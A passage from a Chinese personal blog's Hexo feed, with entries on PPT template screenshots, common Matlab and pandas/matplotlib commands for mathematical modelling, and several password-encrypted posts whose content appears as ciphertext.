    <content type="html"><![CDATA[<p>收集的一些简洁且美观的 ppt 模板样式。</p><a id="more"></a><h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><img src="https://image.hackerjerry.top/Simple-ppt-Templates-1.png#align=left&display=inline&height=292&margin=%5Bobject%20Object%5D&name=image.png&originHeight=583&originWidth=975&size=151805&status=done&style=none&width=487.5" alt="image.png"><br><img src="https://image.hackerjerry.top/Simple-ppt-Templates-2.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&name=image.png&originHeight=437&originWidth=927&size=44029&status=done&style=none&width=463.5" alt="image.png"><br><img src="https://image.hackerjerry.top/Simple-ppt-Templates-3.png#align=left&display=inline&height=294&margin=%5Bobject%20Object%5D&name=image.png&originHeight=587&originWidth=1033&size=187025&status=done&style=none&width=516.5" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>杂七杂八</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ppt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Common-operations-in-Matlab-and-Python</title>
    <link href="/2020/09/02/Common-operations-in-Matlab-and-Python_new/"/>
    <url>/2020/09/02/Common-operations-in-Matlab-and-Python_new/</url>
    
    <content type="html"><![CDATA[<p>记录一下常用命令</p><a id="more"></a><h1 id="Matlab"><a href="#Matlab" class="headerlink" title="Matlab"></a>Matlab</h1><h1 id="读取-xlsx"><a href="#读取-xlsx" class="headerlink" title="读取 xlsx"></a>读取 xlsx</h1><p><code>data = xlsread(&#39;CUMCM2016-C-Appendix-Chinese.xlsx&#39;,1);</code></p><h1 id="python"><a href="#python" class="headerlink" title="python"></a>python</h1><h2 id="读数据集文件"><a href="#读数据集文件" class="headerlink" title="读数据集文件"></a>读数据集文件</h2><p><code>data = pd.read_excel(io=&#39;/content/drive/My Drive/Colab Notebooks/CUMCM2016-C-Appendix-Chinese.xlsx&#39;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scipy.io <span class="hljs-keyword">as</span> scio<br><br>path = <span class="hljs-string">&#x27;ex3data1.mat&#x27;</span><br>data = scio.loadmat(path)<br></code></pre></td></tr></table></figure><h2 id="修改-DataFrame-列名"><a href="#修改-DataFrame-列名" class="headerlink" title="修改 DataFrame 列名"></a>修改 DataFrame 列名</h2><p><code>data.columns = [&#39;t&#39;,&#39;20A&#39;,&#39;30A&#39;,&#39;40A&#39;,&#39;50A&#39;,&#39;60A&#39;,&#39;70A&#39;,&#39;80A&#39;,&#39;90A&#39;,&#39;100A&#39;,&#39;&#39;,&#39;&#39;]</code><br>直接修改它的 columns 属性即可。</p><h2 id="删除-DataFrame-列或行"><a href="#删除-DataFrame-列或行" class="headerlink" title="删除 DataFrame 列或行"></a>删除 DataFrame 列或行</h2><p><code>data.drop(data.index[0], inplace=True)#删除行</code><br><code>data.drop(data.columns[10:], axis=1, inplace=True) # 删除后两列</code></p><h2 id="保存数据到-xlsx"><a href="#保存数据到-xlsx" class="headerlink" title="保存数据到 xlsx"></a>保存数据到 xlsx</h2><p><code>feature_dict_df.to_excel(&#39;/content/drive/My Drive/spss_data.xlsx&#39;,index=False,header=False)</code></p><h2 id="设置图片坐标轴信息"><a href="#设置图片坐标轴信息" class="headerlink" title="设置图片坐标轴信息"></a>设置图片坐标轴信息</h2><p><code>ax1.set_title(&#39;Voltage vs. time&#39;,fontsize = 14)</code><br><code>ax1.set_xlabel(&#39;U/v&#39;,fontsize=12)</code><br><code>ax1.set_ylabel(&#39;t/min&#39;,fontsize=12)</code></p><h2 id="保存图片"><a href="#保存图片" class="headerlink" title="保存图片"></a>保存图片</h2><p><code>plt.savefig(&#39;problem3&#39;,dpi=400)#高质量保存</code></p>]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>python</tag>
      
      <tag>matlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Interpolation-and-fitting</title>
    <link href="/2020/09/02/Interpolation-and-fitting_new/"/>
    <url>/2020/09/02/Interpolation-and-fitting_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="bc43000b241cf75e194c6ff57616cf34abb54f8d565f3134706dd9c21601193b"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>数学建模</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>python</tag>
      
      <tag>matlab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Detailed-description-of-multiple-drawing-functions-in-seaborn</title>
    <link href="/2020/09/01/Detailed-description-of-multiple-drawing-functions-in-seaborn_new/"/>
    <url>/2020/09/01/Detailed-description-of-multiple-drawing-functions-in-seaborn_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8f1a97b59b2988a9dffe63f39cfda002dcaec49227ade16ed5a7dd64bd891868"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>绘图</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数模</tag>
      
      <tag>seaborn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Operational-Research-in-Mathematical-Modeling</title>
    <link href="/2020/08/31/Operational-Research-in-Mathematical-Modeling_new/"/>
    <url>/2020/08/31/Operational-Research-in-Mathematical-Modeling_new/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="69ac006b99f900597e88a6eb6e9445a1389b1dafd56e6d2f2190a4e3e4bea0a7">2d1c998a4a20e18111624d9b5b4d1df9cd239b763b60aa41541bca9cbcc0a15974e4ea47c8121e593e01710771496e260eed5ff323ad2f4fe8a77adac5f38d689d4d0d42fa7961407148893411e2b3d40bb0543dcae96f22b25fc4a97e244b74e7dd9ad8c8fc0041b275db70d0d7a3e0e041da9fbca53f664873b4b5db640e3dd53c86a1a18687390e90d964e21daf95c7ecf4b3b5363d5e7455e4da7407520fb73074e9703395ab9c804718aa3ad2b9e8ceb26cc1be6eac8962c84d6cc7d09eab902073129261ac2b55d27c84c1d928f09a330297203fd5ba949f4090095c64cbdce2138ed04ac514d4b854a5eb6f7218038d89a26d329edefead68441cccc6d690a3df226651140dc2c63102558fc05497e65c0da93af1a3bb65e27df8f3c180d3081269a2fe95d4b07278eeca0af1fb9f100277ecf54b4f350b538ef2adc43f5cadae71d98aec92723220fbc7e55c529a897d03a20697a145a5057d60dc56afa9b8bfbfdbb040da2fc8916b29cb933dadd135521e6193fb3507521b58f068079b2037688ab869ed852ac59cb81e0834fa7a9934ed5cbb6ea235f4e4877300841b5d2585a6c5ff2051f55a834cbee6c3a00dd940d3bd5950df3fbc07d7c509562473065b65c7dc89e962cd02a658cce6c49a88e8903ad8032893c9e4f13e83d30ebd06f3efe3b41eb4ccec0b15f1914a15ce62fcf21f3cca763f39c73c4b3e0c3862a1437804d643e2fa3e2aefe4427ff60b56c85664b2e4f61707df5e8e8f1d6e7cd77a9ff560b18bb4dc08dadc3cbd04d1d998273b05f11681419ab29f9380fbf23ac5a73de0a2c127d339070c9c5811ecb75c65df709253ca5d77e329e629ad866ccb33f5dc039e7e9c2574c765af998bf27c748557898165c4533b8b776e690dabb237a7b827f154e4979d6d6afb42ed0e451152186dfb0cb091ff7b9929c800a8e4c3d64aef37822b910ff1076022ba4bb89c6ef8fd11694a2e4a900f10e4182493d7e26b2264c3e008b4bd323621064487943df344e4f78f5fd50c676c06870a5888fe88a6e3f0c3651dcacf580298cf8776f405d21a2569c758b3c68a79368814d7af2b3497c41b9f45802a94b51cefdebea389a9dfa3b35fff78515b915a2d724628900d46eafd6265edaea77aae585c3ef4f7706a95a7d9b7946a1e85ad102a86935f526567e43d9c22be7fe608ec8382af4ed2be334d19b7f86595ea9efca56d47f11b24d1f3da1c1cbb6f0073c2393a79b78b102d2294f63b00cff141e3ee702b280fb6b0ba630a354f37e05086dc6972f51ebc970c360ff141ad6e4906e7ea8747d79387e00b1a62b89b37aeb93b779e989925f0f460087467bc60a15205d8a4eb16d148c91c17a3ad298bf4213cc2acbe8900e00cfcc217c5bee184b93289a8493ae32fe3ae68da21cb432123055ab941edad3098ebcd74c9751b5e9f2bff66c4e566b5952cb2536489484ed48b56ebf5887eb42d149fd4fc393e0f7de16dad37949620d6d53e531ef3f49b5c5ac42c83c647cb558fb3b41db69e9309a50e225e045d9b16f09bfda465e77142a874ac8079344a62b17ba3b7541374241f35b3b9d694f39fa62812d45cf1da68b902b42e6e259d3a7e523bf160987eea5c2821aa5c6c79926ae1db72d9255d978b44f21502d55f55cd83d0bbe2bb656c5c14901f9d409ccfa185c4b6f1af985dc74d2449126f7dad7b445e0d2bfa8a512503a3fa3df4ef804f7a5bc8683b959f97eff45b9ddcc15b5c0f8c089cbb50bb2c7fd0fe0806b615f33c2aa265012117f46604d8b6ff27d1432ab97d66ca5dd29ba524db842d25754390a9c29a7b99ac5d6275d42e13a05be1331107b6b0959a51ba8bf3b73d21f2af9084ef9afb7db48235eaf0825f588aafd0f69175e5a6b483f9229199925d4c7817d662ad44be6e29a05e224696c8226b5a102401458f0664c842c744656ee0676672ab877f0091e4c5273cb7fa71a7083a3a2d37c4a961bc30c9457a2bfddaeef1957e0f74c6475e940dfa4e671de67ec07f99b73c0bc26aef3a9979a2e8226819688d4cf028251c7b3db05303b19d3412d4bd2e20a663f16774daf4ccb95b3909005a92f67945c439d7622e585efc3be791b41ef5d09f32e1ab993b5fe5bbef8f2983c6e1c37ded9ff5f96836317843ab9cae9043827d47f48cb63ad65bb5e6554524d751e74aab6a9f02a1f27addcdb979ef33e938f8d636ee4efdf4337a71b0c2a3316f5309793aec8e70c0094f52b1d06fcf861ceece8b818612572d87a015d1c9ad13e811e305321548a8750107e1dcba4861307bf0164095e1f88e0e875adc89219f1765024acca912b11d465b87c62bae57deebdc895e2e51d9122d160b59a7ba84ca70cb2967be4f9d755e10cca17681da38a2d2f861347b146530053b218008ab9953a6270f4d051f5d8bff1a4b0f1eb70cf01c800456040fca3395f4792620179944f899ce343aef74d3c974ec44f188366ca5195da140bb6453be348a4c34be009edeecb84753d89f00b653d6bbce0ed685794a481e546caac567585871a06a5b989625ab9fb8aea49339060caeb4dde44db0090c9888d6ca5d62ad28ff14824b30fb56d55b13cb41da98b283202fa4011982c1a65c9dd4ef1ad07219978e3fbde985c4588dfcb03467e0e1f74cde04c6dc2d8b09076a1863f29c66ae33efa815acccc2b2c16028b30b492ddc28333d54e82ac4ed1d6e7d18caf8a48f8c1d1c641fb9c47f67e932a14856329298624680be688d4bdeed723d80fc6d15234b728b3df969fc195490e989655d0562d28d611b8529ab5dc329282086fdea11f5da2f65dadc121453cfce522520befa58cad4c65daba1b299b15deb67816cece227461978b051dcd8cab3b98e1dcdd6eee4890115671cb707b7491eade4107332c228ab6351fd999264567c7093388aca12330d4e3f2bcd17f27eb8dee7aa0b212ba24d381ce1c0a3cb4fcb16fecfcf572ccd28c4edeb2483dd0551bb2515aad7a41aa3fdcf2e08dfb589fcbdce93a3e4cca719aeab20e6d04d442c8b1840a020a1392e02bea7c5217dc2e979d44215636d0d409c38ce1867ad7fad55c02927c512629fb8746d798bab7265f9d1da187aa0defada3da960a0f9038137348041437f218b5b0fa1dcd43c5a40a1228c84cf9d69c8bffb362569292dc6b5ff0b6cebb416468694fc53078b589f9f5e7ee56a0ab1248f8d757eec64188302ebe0f84e0ffad90844b4c90090a6f576ec8222fb0d0420978017517ecec6ac69e5c59e1b0f6a6d2a44254a0eb842949e66895927f764ceb59661719af4b5292d5aaa885779083a1ca0df86f9d65cebe09711684e72d5767ee91164daf6f8ac029b9af432023ee440248629ecb038f29e3a5170fe967b9b9c17b5a2e9d8ce5095ddedbfb8c714a69351b12357f3a71b4963e91af4cc65c1aab6697d2a6ce56b69a39bfdfcc52267ec718ebbdb6622950dee550b85492ae4bc9cea46cc616108ddf76999345d66087257d13310ca66a93f00e4cf57f06e61880bf699c79abd474811e0817c8c77f1a2dbad9ab042cb6c4318e686456344dd691ddb734a95a0497dc2c1445e965b4a8ac9bdc3ceb5d01a061f5f86f21b5d44c5fbe341a214adff8e1e0088afd1520200bcdf0a0dc4aaa79bf0bb46ada9208c1a27de5712f72c955aa7f938f05d1ae3e27363162cb0c98a7af75cdae3272bc8b1fa57169327204dcc8760023a290280e1f23602913e354c8e547bbec9cc455b0327b814840ed4978cce733fbf569f52c9e89eafe8b96e2ec06c11579a972f20f1901e2fc00778b11d1d069f5a4a1633c170aba30967e1c4e51c5c8649530c9e5897c1ce8dbc865c7bd3a8cbea7ef2c9efb77c93ad0ec902c2d2e53694d39a8198eeca02c5da0df86f581efd76bdd26ca53d3c191b9764a513851e98e1b306338f56e20bdc3f6fc991442e1b60efe7237080d1e556f59192a51735c4c809bac04b7997f9cd538fe1467245208302cc13243a012661ea685a4be1a947345d17cd3062fd69edb35f3d0fa753cbf69042d963b7aca500a7756814b212dd04c941f017253954d3f57f74cc9bc82850a410643173f7036a9f86755ffb232cd7b6b035d5118db5bdec362b7caa383508a1a1e3f17acd3ae9e9b00cf079b2bf66b77e87ba9844f8ae0e60bd6de1ce9498b78cbd6de29f0b95d47b29477eb948dc96c03dabc1fec10bdf21ee43035deb765a2eaee46201e4c9a76d68ed5689826cc350e12c14d91f82c4bb3a656b7cdd4a64a90229e71fcc25b18df46558a98a48abe6ce3f9c68c339573f1b744073478c3c41f90c8b0ef86b7686bc052c4f4434eae0b45c910e1f1d088efe8c03c4fc1f158e041d8111e81fdb3d10aaff7d12a22cb0421a06bed58d918d4febba2b18a630c874ef753fd9df717736889ffc14262a325858ebb162498dc20c729d4315991a6ea2de55284138d450378f0f1bced1bd53735e00781ab4f125096c0fa77804c3fba72fc0232d256dcb8efc858b837215608f5b068b9438ed4e0057b9b067478a7245f765ea145620bed06228797009bc60534c37d8a26df474278a9e59a47743281da67d2e0a206d133d2ed57683da22047605b71d0d5ec7cdc85af8bddd5cdd244ca237db3a48b53276783513ba27a747e02af7df6542403afe973aad326a07cd0e53d21da68903e3efe8001b809a2a03cf6f10ac97529b738c17d4bb32c5bf5cb4489b329d1559f28285dc9fae3959d86ccb9a5289886ccf0f33fe9291d01160c9c2e36e5125fd97d3abe21c0e48281355ca25bada44efc11a30dcd4ffef377b011269615d2256c925a17cb057dd2eee59eaed5bd1950d7dd73dfbc279c64fc14bcd57e29c45bc745bb5ecc4e73ed74319102557b783f329ead7e35949d04e226936c3bb73a2b020f39052d8416c566ee8fcf5fa18e4c43c277c4b930e9baafc5d8b0bafc33abffae7b9765f54b105c49e038d6d7e102702ded2eca1e853f226269d82e3ec5453348f7754e5b6c85022550e818e64b9b0eaf55d5ed36d0c14144f401b8762ec7b62293709ee59da25fa15f3bc35c3bd2102a36d70e67cdbea2e721a1bc0ec41431f2ef98a1949c5430f903b58de79035c6818d9cd6474668f93cb8bb362a34170dc528422da8018a13330c94920be5ac1fb0422df536ee1749344929290765d1847524ce5bceda8de659f0a2313bc07b9befc3bbee7d447e1211b7631cfa697e3dae493ff1efacac61a5a908b8b218705a804ec61a4cf389c26e03eb72d183c4538aed65a6f6900c1ef0a8ab24fad76419914d7fafaa1b7c90442d460fbd1c25db2d5aa248e0929957461ebef265704c85ad295d08ad2eff4fd57d25e34485c249e63a5fe28b428d1b4fc9248f6be098cb98b373088f8e1e273a309dd242c81e67df83c6f8165c27cd2cf5086cebbd21e33eb64d415f3713651816613cde7ea0022115773c6a6b9296cdedc9ca7b195c01b1230dba1894e8cba9a912a74d8b4d7a8801d563e66cea649187e96530081c2468e9d87af8c90390cbdcb99960bf4326ae19517bfbd05d08753a2cb02acf1f28026fa4b60d1f9f3d982ac511034768b18e7b0f2df95b3f105e0ce183d322c8262884dc3f465567798f4e72ab8ebaf9733def03ab397e4bc5384547660169ea892affe355d5769e8d85bff523d21e6a85b537b953e46e52b16fc57beb3756bf8ef2fa452dbec005a66444467ff94b776e8003da9817d72b617b22f04bec98e5780a6c500a7f39436e60edfa8e8ee7eb0c53b44a1fd719a8421e0dc18410c2fce0e17f9c376f60c818eb6a49bc0ee415b61e696f4d65402773ef3e6cac809e737f09571170ebfd2368768aae60c5184edbe33426c4596c500425c3714bd6d1ea533e62b07a9f9ac1bde241fab5424cc57b4b7f8901fabe10fb53468ec4ffaa4ab3978f094d0b45520e812e7cce9302513cc5e43eae301347e1359ec6576e809e7bede54ed5cdba756b4925bfe608a0cde1d98ebcaa67c3a1d16a86ceae8d2be135535f77d0cd587e96eeb11d06d3f63f526fbc5cc715d1a8533e5ab042f91abe5cf6c96f5ca96847f512535ba4d76e42c4a38f041f2dcc8ed95046545b344adeef01a929bb6daa22ca80de5df66320735c7b572ae4c6999e9f7f0d6b3161a087da4b27660678908fb5638e58cf2f934095bff9af46052ed61f5c3ba7b0bddefea5f3b149e13b749cb4a1c34a74882deb9b2fa517c3b3df864caa98cfa686fd968fa8092768121c05e2d61fa27974696e1c26f413772d64aa39a23ee16e8f2c5429f83fd1e4559202430ec54dab96073f58e3c3e2d3bef7741ac51a534a688e34a078dfba85ac90a50cee8047417854402a77a8d7dcfa7ff89d43bb4d1a77628cd119bcc7da1cfaeb7887427d11880868bccc34c191a833d0e66d72e61ee494150ecc65753fcaa3bf2e847aa5e7ee2bf7243de10816ef9c8b557bc97d11e6c758b296d7872731b0b5e3bd105c70f9890c5bffe1eb7abbdbd801ce2402256ce02f5fa151d921cb2e02beb863a262f4b2ef01c5269a0086ce7f8f9aaa693452860d4ee85d2d0d14725cf95c8f4caf0b5d871141e3419dfc8458d3a2a2f7e0eb05689b267187661988712883a903d6ed5828669b035f5dc2cd1aa45faadfe061c4bd2740d9431b9de2f00fd98390da93367987548be0a360ee49827a55b9594e04f8af67fb57da2dd4f61234743d008f5254b0a770cbfe5545b7a880f2563d1d2f5830944347938e381a55896149c6053bfba9a8e2ef722f887959b9120b28a96c00c3f992a50be32d80e6b893d1e2ad308edcdd886a028716899c003efd191ad322a9c1135717766845b7ec853eb19a9469b6f3442604c80a8c2f8fa5d86e061e15bec0d02d0e521c75fd9e3c847e54f8c32a1192c4d0a2b6783038900b318ffab624a26d89510ec36f37674d7631181969c8efdfbd89ab204f01a7cfb343f663866f7adc6fa4667c15a0e20f5ea957169ad2d41968c353359f029311c76b18649675dc7dd70beed277086f5db42753e5ad71c38d045944496cefced1990fa607593ce0ca9c7cd6bc205fbb135f611b6caf2cfa0c9bea215bf996f2623e0d938be29274109d9b9360c6181666fb36646fc7699b856f9057c35f327e8c820e4edc4e09c110fe3255ee804b346806289b5290e792b8e64d2c8fdd9fcc74e5ff03ebc94d2918653afd2b0dbc25115f08d2737410325fb2622f9fc9fd369a0883906928f13c25dff00af9636befbd36a6c25c1f22ffda27e176d654dd71a94cd3c3c714d6c2c1333849227a1158f6d67aac01ebef53e99158fc39b139e7515d55395f78d7b916a9f2bea72f7a652c7fb5fcfb41bcd1261eb7d91af35500dd455b1a0c9d818604bb3605eb4dc1654915412a842de14591692e47ecfb74a743a7bfbc153c0fe3ed5beb6a0c713e5292d899f73b3d305f9cf777235a451309e04156eb51ed92eac93b2fcf62fd0254f980c7e1a194943a7050613e02858d4537ea58cf427b44d104603256685d017a285457c45b94a6d077e9c2e601eafb0fa337c0364212a3c54f79064fd81fd42bbde2b5402ee2974477f9b70c787a64bc7e383cc7dd0c63cd6dca3bde52acad59f82ca03e9af662d3154e4923917dca7ee9e11739fec8a9b3ee751c352784955e0d878bfb4a326ba6c3ba7149e6bcc971f77e55bb2caf727c9e5c21511dde480f610a09a24d62802b5eac9949903d270fd3a46f4275892ec6be7d7a25efb8facfd41ab8c07c2728cf96b865dc848b8b9fb8b7236b59449f5d2d8590d99934fd7092dbecb57bafa32ba041a8770e2b1c09bdd9a546fb7a6293b9cc473cdec7e81c4304325537dce8bdef8b840493756d5cc6b3fd003b6bcbb5e6b1fcd799ae0df500fdaad2dd25dbc85d7658d432e42fd1ae972fb2f24ad9c2ab3a5dd8f48c5b8b5074fabef6544274c0dc693755c30927ddead430a57f3248ac2069fdd05cbc5b9da21a04474137682c10ff85ee482a94c61a7bd9b82766d48eaacca3a660055402ae84ddf70f20e71c2116ecdc5dded630691c3a23e6e9040c6e03fd478a459a6ebbe8179ecc34b338d3384b48ffa7dfbfa17ba3a611e4053010c2e44ca9d742aae00701d9ab3f0c9a1e7fe5727bdebdd0dda62ffcdbc6afe0c1dad36db08139c3bee44069eb9cf3e08ecaebe6ae0ec6f3014e6ea4858ac8ae91c937e69f565ba0135e993c75a788ce950e9e5dc6138a0daaebb7cc187aae7079579b7aeb6b3746fdd63e10e8d811a02f9ea64d69c3b6d16d32aaa4b50b3c2793b69e9e259e3404111ba5a2a0d625d1799c97da9b78da45188300ea70f22bcac7e9ab3a394cae092cea3b7ae32e8a50cc658fff3a29ea13233a9fd5b9441208097b0a5ea5ff1a28e52fadc7c6b01615193e5fb771fdd2ab94205b5ed48f1b11365591e024bcd19b1f727200b223af086bed8eb28fc7b8c29218a0b67791ce42fb7f3c79838623d67bcd603734d1b7b88bc51bc1434432d4e9c788492234ae3e80dfa8a59ec2dc36448c76d695ede4216ed540106de0b86087ff27df490b374b14d3ad9d4225bd944f3c789cab02fab1c894605a57b318afe1594457bb3d555fc2968ec5277fdac8fec15067af0bfd5f6e5929c8b0e2f01090f04ba8f007dd183180365dbdd81257886ec8ef36dd3f26e645c4de3d8f9cb89a03b746713b2b5af62be464727e770cd0d89ce414394248ee90c6e722ab105e46d4d235a699ea6152bb9d26aff092d9f2c3f9aefd46a52638ec98278c8126efdc5b61c6fb3e3ec899b6c260d4eca38a43514ca3baf7d182d65d1b72e7fb6f3eeec743ea2fb89b1383a322de4cdaa30ea724fc1491002a988f6d68067ec8915705ea7e4c1d46237c2749b01c5b724265ad036555e639006ec58068051fa3bbc3a578ea10c03137cc9c2bb47ce5441929f8ca4145eac69b2ca5d498695e7d5caeed097d10c835bf9a1a8e2dfb0044d1f63262b39ac89bfef38d86a021f742ce3752fe64ccdf53da5393dc427189d9d9d1e31bd385441f1587488e59b00d1721cf7c51201243a08f2c64e2434a124c53a1190506bf074e94c97ecddc2bbeda07b7a92f88bb3b1ed1e1fc81bce6de5cd32b698f4c098a8d21d87623952216ebf929cfd4e326b9c1d878879f7c16d5f413b259b697b3825d8788fcb0210c0e9d59f02710783fd7a69fd970f157bbb5a509e21267edf415f59b448336b05c05665cce15d21608b7cfca583e2c557ab9e40c625b529a61b41c40b099f3b9473412fdbcdb168dcbf786b1222aa9e749b95f682322c1e0699af09613b248a70c8accf0fe4528e582ba99a93a033f950a44d3894f986d4b64b8234b1aea4a06a62b4f8049ae38fb1e60b93c09570b33986773d4ddd5b1afeef5dc49560263bc8de22befe02922b60380baa51ac930ec570518229c1eec29c461c8547f455a866d6f86218fa0bd8a600abdb2d7fe87acf86a7df11819460663c44228ccea9feb3242928dc1b817283fffea06fa2086a35e5a78024df75cf9aad2e8a9c4211c2f6ac3c12f0d851b78418af62a908c6a6386862e436580efb13dd03ffc33adb109b76981c61e286724a3cb0a6b791d7cb035fefb2a8e7397f66876fb0322365b83b6c2febfd920522bde96e7ddbdd36a32ae83d35a05ec48da8531b9cd115ae52b8a86e390970be1707973d4e249e6a8a639feabaf3003657b7ecb7abefdbb3093bb45a1aa7a7d6d8dca12649916691b0f9c5ef2116fd78847b35810c1aed4cd6914f1ade91db6527a8fc3faba9a513ceefa75f55c13f36965e6419c9e44270b040472f6066ed876dabab2e57b50617c9b721c6c085444f800aa79c531cf9a71150db31c97e7a9f732f1c4a32280471bc9dd9262337e7e98d0a488afcde893fa305d6cfd89f9942e5f2d500c286c6130e33b5c10cd21c85ba1910f40a6815fcd35ad523eade944a87eb1480347d9fbe772636311903b85bf31546d0d4aad72bfed6e259c18bddbe49c7b986d84bfdb5de23f8efbab6cff00717c06ec660520be6d8ce549d87f105dd3752f00a45ec13a9f29bf0986130099ec46eeae750b2bb9852093ad2f5f8f0785ccde53d57acae9f822840139d32ff16568c92bf3f549d916bbb1ac586568cd621eb3a6996134c1d5c3b498ce5571fe79b19b09cf0ce1dfab9dcbeda15007e69f75d8ea17cd285b81dce2f5672ba06f59c703b862c39d2d30c083ce41530a5547f67b7b43df5705dd57f0827b03012af9d08f0ff0de0f38f7e5270d70fc99fd34f13789ea774f3ab2136318520cca849c1c978212eb16a3086be250d3593a1c3a43ec7fd383dac33e8b68c4211f9f0a39972956e33f834315622e5e014556c47a9a5707eff447be4d3c552e3a1a63cb8bc91d143fe9f8edf89290b2f4bc64e701f1c1acf917ecbf3af21232407ffed1906bcdc7652f0eddfab6a2b4c8675b1c1ee77535db79c4e397754347a44716f6c4b8993ac82cab405403864b8aa3daaf1e23ce562dce5c86b59e28a7390f718da847466f79c86672821c0b04ecaff5f08887068d2e8743a2b53787962e14f86d8a385cffc31a52cf61838ad3c5215845880eaa8ff84bf4b52016f8160405712d74f0915ae386bd003a997f3ed1faf35056440548f93e5be2ec06f15d02645947a7ee37555e893d6862c267a59022c5973b941a9317d998b7f8a0949e0b8fbd3bbf3ad67b25b15a058a5861ccd61193b91aced11a35c40f589844d9c69b838a8d2518992415cb97f53e62e425615882d356dc43f598753fb1e3da702566b51bf2fbe9910711ce58a67a1b3225bedc48bd6f48e8cc7cad060e8c2082cc31ca5530157b550f2b065f2c42994b95ae69d093f872263226a432546cad28b2f1761ee1f32f6e78967a4caa9f7b0d09f4d22992576cd0cc5d5b131673480d72d039ce34b79675c4d625859a4ae4d512f5b80dab4cac761eff40d4558c2928dccf3e89c176eb083f7766f0d876bcec5ec618f21b327936007e33beec260b4dfa1425d26df6f3ce0982fbaaffced4fd032bd75575f93ae6eb91153fc3223afcfdd74a456afc91283cd51094ba73a1507551167ba73626cf0cc63cbc02fc64c6dda44cc9d4ad352aee1c0256c422a23ef00d842438d6d349439361b2d082d14bd6c7a1876173b971d6b0ca9904b59fa7d930febabd82afef63671ef60a56bb2bde848114038afb068319d70fce6f1afceaa5f916eadfb5d5058fcae8242548538fea5c9416c20a8114fca3656be34d09b48da34b28a429a8d898005a587c88c0240844255ddb24b7cab22800d2cdc2c6e187ee3677844e7a7fbcdc5d2df3ce1c136283d8353372b4768301fd8378a519d8f283a5cb4de361d65b732690ca12573f9ae9c1b4fa9d424266d98d92c9a90f84429360152e25a88ce7b6335881a8d616bad26a0b5c46898ff1ea21ac126166cf55ec839d1830c1235bcf1eac60e0c16868200c88423c34f363762db178c2fb531c484e98a543e3de514ca9abdd46e7f2a2a635dc19dcab6b3ee7c3e29ac9d910ab0ffdea3d794769d0ee2babfd63a20b4c38cd2f4d00bac7dfa6491de15fc0c8a0a0d3762e103a1e2ec9ccc32831f9076fcafe1e0fd52c75f51d20bde212062163ec581058a971a07da3a0e9ec7f5d179659ab8c6928f5741dff18460bcefbfae056999c16fc5f79eeed70e66a90ee655fad6380221abc6b16ccb46c70f09a98d84f38455e656f816acfe8c40af007d70b0f9c45c6e5e6862ae4a5b9ac835576d9c5ffaa9a2f1bc762186b432c217b4a855e47eaefa5fbd703ba145e232f48315e01e8caec00ab9f6f2950e2a627b962b1812834b0e317b15d2e806b39187e41dbda0217fc3e0936cde65e5b3da108279d7479f347fe369ce0ffc25f495228dbeabf7418f73a13100d01264a36c02d01be6ed68e928d89ca133b8cfc5a33fe7fff750d8de8aabdebb57c9b69a4d881522abbccb95f3f3f30c1474e007f207d077aaf2f2bd5b83508080f55dff6cdc44fd8c26229c4bbe2f55ee4294dce82ba510352d480f94f02bfcdf5b69c2fa56c938a5583932affbfc721adf74a44a93ed55d68acb3bceb38077d26381e43fa82d7d6c9ea464333c207e3018fb30ab8182b1d03db774c2e0e0725e965510b2f1afd901b74211f0f1c9ff20652e17a2460804b96dbce98654e294c2471e3c13cac188ce83158318de2482663609eded46413183cded1d4607c6f81bbc215acadde3167d8cfb27017159ef856d4938bc2f02867b4c7501dbdf889890efdc90bb1b0c3f1b0c52bc09858ca629d102c2055757e941b7b58840fceb64573de38e54e97124536bbd9c0127c02dc2537f427ee691f5463d23ac7ee72b19281544fcea3d6833824197f6de3029a541cc39dbe166b1daca504e11f21b140cf9a3d679b1e8baf564332183f660f24aa9d6f33f933bcfb6263ba23ee49fba16643509bb2d4d3cc3b38289bd204e1b2d9138275d3d658bb615dd631045f4ae07e9eedfdba8f53ab28d197d3bc9f79b7dd3252dcdf5ceb88ab2f246d2793c584cf57c5c81019121d8cff8f1742f01633472e7ea8c3f3c435aaa2a6a340f2034168220f443d00c0bdb37025ace979f044ac5a4edcd96d8ef406440a71f56a487ad49393779d88280ac9fa5b4ab5339b6558d7e80293cc9